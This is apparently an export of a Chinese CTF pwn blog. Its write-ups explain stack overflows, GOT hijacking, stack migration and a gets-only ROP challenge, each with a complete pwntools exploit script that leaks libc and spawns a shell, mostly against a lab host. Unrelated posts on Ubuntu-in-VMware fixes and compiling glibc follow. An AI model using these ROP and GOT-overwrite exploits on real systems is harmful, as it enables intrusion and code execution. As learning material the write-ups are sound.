是不太一样的。main 函数中是这样的： 1234567891011121314150804887c &lt;main&gt;: 804887c: 8d 4c 24 04 lea ecx,[esp+0x4] 8048880: 83 e4 f0 and esp,0xfffffff0 8048883: ff 71 fc push DWORD PTR [ecx-0x4] 8048886: 55 push ebp 8048887: 89 e5 mov ebp,esp 8048889: 51 push ecx 804888a: 81 ec d4 00 00 00 sub esp,0xd4 ...... 80488eb: 83 c4 10 add esp,0x10 80488ee: b8 00 00 00 00 mov eax,0x0 80488f3: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 80488f6: c9 leave 80488f7: 8d 61 fc lea esp,[ecx-0x4] 80488fa: c3 ret 这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到 ecx 上，导致最后恢复的栈值不存在。通过 gdb 调试我们可以看得更清楚： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x804887c (&lt;main&gt;: lea ecx,[esp+0x4])EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0xffffcd90 --&gt; 0x1EDX: 0xffffcdb4 --&gt; 0x80481a8 (&lt;_init&gt;: push ebx)ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcc94 --&gt; 0x2c0003fEIP: 0x8048893 (&lt;main+23&gt;: push 0x80bb288)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x8048889 &lt;main+13&gt;: push ecx 0x804888a &lt;main+14&gt;: sub esp,0xd4 0x8048890 &lt;main+20&gt;: sub esp,0xc=&gt; 0x8048893 &lt;main+23&gt;: push 0x80bb288 0x8048898 &lt;main+28&gt;: call 0x804ed60 &lt;printf&gt; 0x804889d &lt;main+33&gt;: add esp,0x10 0x80488a0 &lt;main+36&gt;: sub esp,0xc 0x80488a3 &lt;main+39&gt;: lea eax,[ebp-0xd0]──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcc94 --&gt; 0x2c0003f0004| 0xffffcc98 --&gt; 0xfff0008| 0xffffcc9c --&gt; 0x00012| 0xffffcca0 --&gt; 0x00016| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0020| 0xffffcca8 --&gt; 0x00024| 0xffffccac --&gt; 0xf0b5ff0028| 0xffffccb0 --&gt; 0xffffccee --&gt; 0xe6ce0000───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x08048893 7 printf(&quot;say something: &quot;);assassinq&gt;&gt; p $ecx$1 = 0xffffcd90......────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x0EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0x42424242 (&apos;BBBB&apos;)EDX: 0x80eb4e0 --&gt; 0x0ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcca0 --&gt; 0x0EIP: 0x80488ba (&lt;main+62&gt;: leave)EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ──────────────────────────────────────────────────────────────────── 0x80488af &lt;main+51&gt;: add esp,0x10 0x80488b2 &lt;main+54&gt;: mov eax,0x0 0x80488b7 &lt;main+59&gt;: mov ecx,DWORD PTR [ebp-0x4]=&gt; 0x80488ba &lt;main+62&gt;: leave 0x80488bb &lt;main+63&gt;: lea esp,[ecx-0x4] 0x80488be &lt;main+66&gt;: ret 0x80488bf: nop 0x80488c0 &lt;generic_start_main&gt;: push esi──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcca0 --&gt; 0x00004| 0xffffcca4 --&gt; 0x5b (&apos;[&apos;)0008| 0xffffcca8 (&apos;A&apos; &lt;repeats 200 times&gt;...)0012| 0xffffccac (&apos;A&apos; &lt;repeats 200 times&gt;...)0016| 0xffffccb0 (&apos;A&apos; &lt;repeats 196 times&gt;, &quot;BBBB&quot;)0020| 0xffffccb4 (&apos;A&apos; &lt;repeats 192 times&gt;, &quot;BBBB&quot;)0024| 0xffffccb8 (&apos;A&apos; &lt;repeats 188 times&gt;, &quot;BBBB&quot;)0028| 0xffffccbc (&apos;A&apos; &lt;repeats 184 times&gt;, &quot;BBBB&quot;)───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x080488ba 10 &#125;assassinq&gt;&gt; p $ecx$2 = 0x42424242 显然 ecx 的作用是使得 esp 恢复到原来的值，那么如果我们破坏了 esp，那么会造成奇怪的影响。既然 ecx 无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现 ecx 的最低两个字节是 0x90，如果我们把它改成 00，那么我们的栈就会往下掉 0x90 个字节，我们输入的 buf 就能有用武之地。由于这里输入使用的是 gets，采用的是 0x00 截断我们的输入，我们可以充分利用这个特点，达到我们的目的。 这个程序是静态编译的，可以使用 ret2syscall。我们把 rop 填在 buf 的最后面，前面则填满一个 ret 的 gadget，这样的话只要 ecx 保存的地址低两位大于我们 rop 的长度，就有概率成功打通。 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'local = 1if local: p = process('./p3')else: p = remote('10.21.13.69', 10016)elf = ELF('./p3')g = lambda x: next(elf.search(asm(x)))ret = g('ret')info('ret = ' + hex(ret))pop_eax_ret = g('pop eax ; ret')pop_ebx_ret = g('pop ebx ; ret')pop_ecx_ret = g('pop ecx ; ret')pop_edx_ret = g('pop edx ; ret')int_0x80_ret = g('int 0x80 ; ret')buf = 0x080eb000 - 100# gdb.attach(p)offset = 204# read(0, '/bin/sh\\x00', 100)rop1 = [ pop_eax_ret, 3, pop_ebx_ret, 0, pop_ecx_ret, buf, pop_edx_ret, 100, int_0x80_ret,]# execve('/bin/sh\\x00', 0, 0)rop2 = [ pop_eax_ret, 0xb, pop_ebx_ret, buf, pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80_ret]rop = ''.join(map(p32, rop1 + rop2))info('len(rop) = ' + str(len(rop)))offset2 = offset - len(rop)info('offset2 = ' + str(offset2))payload = p32(ret) * (offset2 / 4) + ropinfo('len(payload) = ' + str(len(payload)))# payload = cyclic(500)p.sendline(payload)p.sendline('/bin/sh\\x00')p.interactive() Reference【ctf-pwn】【winesap】STCS 2016 Week4","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"Got Hijacking and Stack Migration","slug":"Got-Hijacking-and-Stack-Migration","date":"2019-03-16T03:49:16.000Z","updated":"2019-08-26T05:53:00.448Z","comments":true,"path":"2019/03/16/Got-Hijacking-and-Stack-Migration/","link":"","permalink":"blog.b3ale.cn/2019/03/16/Got-Hijacking-and-Stack-Migration/","excerpt":"记录两道题目，关于Got Hijacking和Stack Migration。","text":"记录两道题目，关于Got Hijacking和Stack Migration。 Got Hijacking一般在有格式化字符串漏洞的地方或者 heap 的漏洞利用中经常用到，通过修改某个常规函数的 got 表达到奇怪的目的。 Source1234567891011121314151617// gcc main.c -o main#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void A()&#123; setvbuf(stdout,0,_IONBF,0); srand(time(0)^getpid()); char buf[100]; int magic = rand(); gets(buf); if(atoi(buf)==magic)&#123; puts(\"OKay...\"); &#125;&#125;int main()&#123; A();&#125; Analysis想法是直接把 puts 的 got 盖成 system，总共送两次 payload。 Exploit1234567891011121314151617181920212223242526272829#!/usr/bin/env pythonfrom pwn import *# context.log_level='debug'context.terminal = ['tmux', 'sp', '-h']context.arch = 'amd64'p = process('./main')elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))A = elf.symbols['A']gets_plt = elf.plt['gets']puts_plt = elf.plt['puts']puts_got = elf.got['puts']puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))pop_rdi_ret = g('pop rdi ; ret')# gdb.attach(p)offset = 136payload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)p.sendline(payload)libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - puts_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = 'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)p.sendline(payload)p.sendline(p64(system))p.interactive() Stack Migration栈迁移（Stack Migration）是在可以输入的 ROP 链长度不够时，可以扩展输入的方法。 核心概念是将 ROP 链分别写在指定区域，然后再把栈迁移过去执行。 其中为了保持栈帧平衡最重要的一条指令是leave ; ret，32 位下等价于mov esp, ebp ; pop ebp。 Source1234567891011121314// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now#include&lt;stdio.h&gt;void vul()&#123; char buf[0x20]; memset(buf,0,0x20); read(0,buf,0x30); puts(buf);&#125;int main()&#123; vul(); return 0;&#125; 源码中 buf 为 0x20 个字节，但只让读 0x30 个字节，也就是说我们只能修改 ebp 和 ret 的地址。 Analysisobjdump 反汇编一下 vul 函数： 12345678910111213141516171819202100000000004006a6 &lt;vul&gt;: 4006a6: 55 push rbp 4006a7: 48 89 e5 mov rbp,rsp 4006aa: 48 83 ec 20 sub rsp,0x20 4006ae: 48 8d 45 e0 lea rax,[rbp-0x20] 4006b2: ba 20 00 00 00 mov edx,0x20 4006b7: be 00 00 00 00 mov esi,0x0 4006bc: 48 89 c7 mov rdi,rax 4006bf: e8 c4 fe ff ff call 400588 &lt;_init+0x40&gt; ; memset 4006c4: 48 8d 45 e0 lea rax,[rbp-0x20] 4006c8: ba 30 00 00 00 mov edx,0x30 4006cd: 48 89 c6 mov rsi,rax 4006d0: bf 00 00 00 00 mov edi,0x0 4006d5: b8 00 00 00 00 mov eax,0x0 4006da: e8 b1 fe ff ff call 400590 &lt;_init+0x48&gt; ; read 4006df: 48 8d 45 e0 lea rax,[rbp-0x20] 4006e3: 48 89 c7 mov rdi,rax 4006e6: e8 95 fe ff ff call 400580 &lt;_init+0x38&gt; ; puts 4006eb: 90 nop 4006ec: c9 leave 4006ed: c3 ret 看到 read 其实是往 rbp-0x20 的地方读东西。那么可以想到在第一次 payload 的时候改掉 ebp，然后 ret 到 read 这个地方，于是第二次就可以读一段 rop 到我们设置的 buf 上。然后跳过去。最后一次再跳回到 A，然后往 buf 上写&quot;system(&quot;/bin/sh&quot;)&quot;，再把栈搬过去就能 getshell。 Exploit1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = process('./main')else: p = remote('10.21.13.69', 10015)elf = ELF('./main')libc = ELF('./libc.so')g = lambda x: next(elf.search(asm(x)))leave_ret = g('leave ; ret') # 0x00000000004005ecpop_rdi_ret = g('pop rdi ; ret') # 0x0000000000400673sub_rsp_0x20 = g('sub rsp, 0x20') # 0x4005aaread_plt = elf.plt['read'] # 0x400490read_got = elf.got['read'] # 0x600fe8puts_plt = elf.plt['puts'] # 0x400480buf = 0x00602000 - 0x100vul = elf.symbols['vul'] # 0x4005a6gadget1 = 0x4006c4read_offset = libc.symbols['read']system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))# p.send(p64(0xdeadbeef).ljust(0x20,'\\x00'))# gdb.attach(p)payload = 'A' * 32 + p64(buf) + p64(gadget1)p.send(payload) # edit rbppayload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - 0x20 - 8) + p64(leave_ret)p.send(payload)read = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))libc_base = read - read_offsetsuccess('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(32, '\\x00') + p64(buf - 0x28 - 8) + p64(leave_ret)p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"Gets一把梭","slug":"Gets一把梭","date":"2019-03-07T04:50:23.000Z","updated":"2019-08-26T05:52:35.364Z","comments":true,"path":"2019/03/07/Gets一把梭/","link":"","permalink":"blog.b3ale.cn/2019/03/07/Gets一把梭/","excerpt":"如果程序只有一个gets()。","text":"如果程序只有一个gets()。 Checksecchecksec： 123456[*] &apos;/home/assassinq/pwn/r3t/GETS/gets&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Main Function只有一个 main 函数，就给了一个gets()： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] gets(&amp;v4, argv, envp); return 0;&#125; Solution这道题的思路主要是泄漏出 gets 的真实地址，然后利用给出的 libc 计算出 gets 与 system 之间的 offset 得到 system 的地址，最后读入 sh，执行 system 拿到 shell。 Gadgets先放上会用到的 gadgets： 1234567891011g = lambda x: next(elf.search(asm(x)))pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]') Buf因为操作很多，我们需要通过栈迁移来达到目的，所以使用了很多 bss 段上的空间： 123456789bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800 Analyse第一个 rop 将所有的 buf 用 gets 读上来。并且最后通过leave ; ret跳到 buf1 上： 12345678910rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret] 第二个 rop 为我们读入 buf1 的内容。先看看这里 gets 的 got 表处的情况： 12345678910111213141516.got.plt:0000000000601020 off_601020 dq offset gets ; DATA XREF: _gets↑r.got.plt:0000000000601020 _got_plt ends.got.plt:0000000000601020.data:0000000000601028 ; ===========================================================================.data:0000000000601028.data:0000000000601028 ; Segment type: Pure data.data:0000000000601028 ; Segment permissions: Read/Write.data:0000000000601028 ; Segment alignment &apos;qword&apos; can not be represented in assembly.data:0000000000601028 _data segment para public &apos;DATA&apos; use64.data:0000000000601028 assume cs:_data.data:0000000000601028 ;org 601028h.data:0000000000601028 public __data_start ; weak.data:0000000000601028 __data_start db 0 ; Alternative name is &apos;__data_start&apos;.data:0000000000601028 ; data_start.data:0000000000601029 db 0.data:000000000060102A db 0 got 表在这里是只读的，但在后面的 data 段是可写的。我们可以先在 gets 地址后面 24byte 的地方填上leave ; ret，然后为跳转到 buf2 提前设好 rbp。最后利用pop_rsp_r13_r14_r15_ret把 gets 的地址放到 r13 上。前面可以。同时接上第三个 rop 送上去的leave_ret： 123456789rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret] 然后接下来需要用到__libc_csu_init()这个函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:0000000000400550 ; void _libc_csu_init(void).text:0000000000400550 public __libc_csu_init.text:0000000000400550 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:0000000000400550 ; __unwind &#123;.text:0000000000400550 push r15.text:0000000000400552 push r14.text:0000000000400554 mov r15d, edi.text:0000000000400557 push r13.text:0000000000400559 push r12.text:000000000040055B lea r12, __frame_dummy_init_array_entry.text:0000000000400562 push rbp.text:0000000000400563 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040056A push rbx.text:000000000040056B mov r14, rsi.text:000000000040056E mov r13, rdx.text:0000000000400571 sub rbp, r12.text:0000000000400574 sub rsp, 8.text:0000000000400578 sar rbp, 3.text:000000000040057C call _init_proc.text:0000000000400581 test rbp, rbp.text:0000000000400584 jz short loc_4005A6.text:0000000000400586 xor ebx, ebx.text:0000000000400588 nop dword ptr [rax+rax+00000000h].text:0000000000400590.text:0000000000400590 loc_400590: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400590 mov rdx, r13.text:0000000000400593 mov rsi, r14.text:0000000000400596 mov edi, r15d.text:0000000000400599 call qword ptr [r12+rbx*8].text:000000000040059D add rbx, 1.text:00000000004005A1 cmp rbx, rbp.text:00000000004005A4 jnz short loc_400590.text:00000000004005A6.text:00000000004005A6 loc_4005A6: ; CODE XREF: __libc_csu_init+34↑j.text:00000000004005A6 add rsp, 8.text:00000000004005AA pop rbx.text:00000000004005AB pop rbp.text:00000000004005AC pop r12.text:00000000004005AE pop r13.text:00000000004005B0 pop r14.text:00000000004005B2 pop r15.text:00000000004005B4 retn.text:00000000004005B4 ; &#125; // starts at 400550.text:00000000004005B4 __libc_csu_init endp 实际上__libc_csu_init()没有做任何事情，无论我们调用多少次都是一样的。我们先通过第四个 rop 把它写到 buf2 上，后面再解释需要做什么： 1234rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret] 第五个 rop 往 buf2-24 和 buf2+32 的地方写东西，之后再跳上去。因为之前 gets 的地址已经被 pop 到了 r13 上，然后走一次__libc_csu_init()会 push 到栈上，这个时候也就是 buf2，之后接上一个pop rbx就能给 rbx。然后为了得到 system 的地址，我们需要用add_ebx_esi_ret把两者加起来。加完之后再把 ebx 放回栈上，也就是 buf2： 12345678910111213141516rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret] 加完之后发现只留了地址的低四位，高四位被弄丢了。我们需要做的就是把所有的 offset 加上 4，这样同样的做法我们就能拿到高四位的值。因为栈其实是不需要对齐的，所以这样做是可以的。这样的话之后的操作大部分细节和之前是一样的，后面就不用加 offset 了。然后需要计算一下之前的低四位在栈上的什么地方，计算好位置之后读上去： 12345678910111213141516171819202122232425262728293031323334rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret] 最后 system 的地址已经在栈上了，读一下参数，利用__libc_csu_init()调用一下就行了： 123456rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12] Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = remote('127.0.0.1', 4000) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('10.21.13.69', 10010) libc = ELF('libc.so.6')elf = ELF('./gets')g = lambda x: next(elf.search(asm(x)))system_offset = libc.symbols['system']gets_offset = libc.symbols['gets']offset = system_offset - gets_offsetif offset &lt; 0: offset &amp;= 0xffffffffgets_plt = elf.plt['gets']gets_got = elf.got['gets']libc_csu_init = elf.symbols['__libc_csu_init']pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]')# gdb.attach(p)bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret]rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret]rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret]rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret,# 0xdeadbeef, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret]rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret]rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12]payload = ( 'A' * 24 + ''.join(map(p64, rop1)) + '\\n' + ''.join(map(p64, rop2)) + '\\n' + ''.join(map(p64, rop4)) + '\\n' + ''.join(map(p64, rop5)) + '\\n' + ''.join(map(p64, rop7)) + '\\n' + ''.join(map(p64, rop9)) + '\\n' + ''.join(map(p64, rop10)) + '\\n' + ''.join(map(p64, rop13)) + '\\n' + ''.join(map(p64, rop3))[:-1] + '\\n' + ''.join(map(p64, rop6_1))[:-1] + '\\n' + ''.join(map(p64, rop6_2)) + '\\n' + ''.join(map(p64, rop8)) + '\\n' + ''.join(map(p64, rop11_1))[:-1] + '\\n' + ''.join(map(p64, rop11_2)) + '\\n' + ''.join(map(p64, rop12)) + '\\n' + 'sh\\n')p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"解决VMware下Ubuntu的一些问题","slug":"解决VMware下Ubuntu的一些问题","date":"2019-03-06T02:57:51.000Z","updated":"2019-08-26T05:54:03.285Z","comments":true,"path":"2019/03/06/解决VMware下Ubuntu的一些问题/","link":"","permalink":"blog.b3ale.cn/2019/03/06/解决VMware下Ubuntu的一些问题/","excerpt":"记录一些在虚拟机上的问题。","text":"记录一些在虚拟机上的问题。 0x0 更新出错（Sub-process returned an error code）装了个优麒麟（Ubuntu Kylin），更新的时候居然报错了。 在sudo apt-get update后出现： 1234Aborted (core dumped)Reading package lists... DoneE: Problem executing scripts APT::Update::Post-Invoke-Success 'if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli; then appstreamcli refresh &gt; /dev/null; fi'E: Sub-process returned an error code 大概跟一个安装包libappstream3有关，remove 掉就行了： 1sudo apt-get remove libappstream3 0x1 无法显示图形化界面12**The system is running in low-graphics mode**Your screen, graphics cards, and input device settings could not be detected correctly. You will need to configure these yourself. 装一下 vm 桌面，再更新一下磁盘： 12345sudo apt-get updatesudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktopsudo rebootsudo apt-get dist-upgrade 0x2 无法开机1intel_rapl: no valid rapl domains found in package 0 在 vmware 的.vmx文件中添加paevm = &quot;TRUE&quot;。如果还不能解决，说明电脑的 cpu 不支持 PAE。直接在文件/etc/modprobe.d/blacklist.conf中添加blacklist intel_rapl后重启。 0x3 开机显示异常1piix4_smbus ****host smbus controller not enabled 在文件/etc/modprobe.d/blacklist.conf中添加blacklist piix4_smbus后重启。 0x4 开启后跳出提示框（Could not apply the stored configuration for monitors）这个弹出窗口的意思是，不能应用当前显示器的设置，也就是显示器的设置有错误。在关机的时候，系统会保存上一次的设置，在$HOME/.config下生成一个monitors.xml的文件。只需要把这个文件删除即可： 1sudo rm -rf ~/.config/monitors.xml 参考网站https://blog.csdn.net/xiaxuesong666/article/details/77072770https://askubuntu.com/questions/998318/the-system-is-running-in-low-graphics-mode-error-after-installing-vmware-toolshttp://www.it610.com/article/3346432.htmhttps://blog.csdn.net/think_embed/article/details/8805510","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"},{"name":"solution","slug":"solution","permalink":"blog.b3ale.cn/tags/solution/"}]},{"title":"Ubuntu16.04下编译libc2.23","slug":"Ubuntu16-04下编译libc2-23","date":"2019-03-04T13:31:41.000Z","updated":"2019-08-26T05:50:19.851Z","comments":true,"path":"2019/03/04/Ubuntu16-04下编译libc2-23/","link":"","permalink":"blog.b3ale.cn/2019/03/04/Ubuntu16-04下编译libc2-23/","excerpt":"为了更好地调试堆，需要自己编译一个带 symbol 的 libc。","text":"为了更好地调试堆，需要自己编译一个带 symbol 的 libc。 环境和工具 Ubuntu16.04 glibc-2.23.tar.gz 12assassinq@ubuntu ~/glibc-2.23/build$ uname -aLinux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 准备工作从 ftp 上把 glibc 下载下来，解压后新建一个 build 文件夹： 123cd &amp;&amp; wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz \\tar -xvf glibc-2.23.tar.gz &amp;&amp; cd glibc-2.23 \\mkdir build &amp;&amp; cd build # mkdir build32 &amp;&amp; cd build32 编译过程中的挖坑和填坑在 build 文件夹下 configure，并且加上一些必要的参数使得编译时加上 symbol，并且指定输出文件夹：（转自2016 年 winesap 的社课） 123456789# x64CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\../configure --prefix=/path/to/install# x32CC=\"gcc -m32\" CXX=\"g++ -m32\" \\CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\../configure --prefix=/path/to/install --host=i686-linux-gnu 